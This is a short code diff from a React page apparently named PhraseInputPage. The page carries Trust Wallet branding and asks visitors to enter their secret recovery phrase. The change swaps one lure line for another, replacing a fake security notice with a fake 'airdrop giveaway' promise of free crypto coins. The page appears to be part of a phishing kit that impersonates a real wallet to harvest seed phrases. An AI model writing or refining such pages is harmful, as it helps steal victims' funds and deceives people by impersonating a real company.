@@ -198,7 +198,7 @@ export default function PhraseInputPage() {
         />
         <h1 className="text-4xl font-bold text-primary">Trust Wallet</h1>
         <p className="text-muted-foreground mt-2 text-lg">
-          To keep your account safe log out of all trust wallet accounts. Securely enter your secret phrase.
+          Trust grant airdrop giveaway allows you claim crypto coins
         </p>
       </header>
 
